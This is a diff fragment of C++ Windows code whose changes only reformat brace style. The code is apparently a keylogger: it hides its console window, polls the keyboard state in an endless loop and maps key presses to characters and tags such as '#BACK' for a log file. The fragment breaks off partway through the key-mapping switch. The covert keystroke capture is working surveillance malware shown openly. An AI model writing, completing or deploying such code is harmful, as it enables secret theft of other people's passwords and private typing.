@@ -3,32 +3,24 @@
 #include <algorithm>
 #include <string>
 
-int main()
-{
+int main() {
     ShowWindow(GetConsoleWindow(), SW_HIDE);
     std::ofstream log;
     BYTE state[256];
     GetKeyboardState(state);
     BYTE tmpState[256];
     std::string tmp; 
-    while (true)
-    {
+    while (true) {
         Sleep(15);
         std::copy(std::begin(state), std::end(state), std::begin(tmpState));
         GetKeyState(0);
         GetKeyboardState(state);
-        for (int i = 8; i <= 190; i++)
-        {
-            if ((int(tmpState[i]) == 0 && int(state[i]) == 129) || ((int(tmpState[i]) == 128 && int(state[i]) == 0)))
-            {
-                if ((i >= 65 && i <= 90) || (i >= 48 && i <= 57))
-                {
+        for (int i = 8; i <= 190; i++) {
+            if ((int(tmpState[i]) == 0 && int(state[i]) == 129) || ((int(tmpState[i]) == 128 && int(state[i]) == 0))) {
+                if ((i >= 65 && i <= 90) || (i >= 48 && i <= 57)) {
                     tmp = char(i);
-                }
-                else
-                {
-                    switch (i)
-                    {
+                } else {
+                    switch (i) {
                     case VK_BACK:
                         tmp = "#BACK";
                         break;
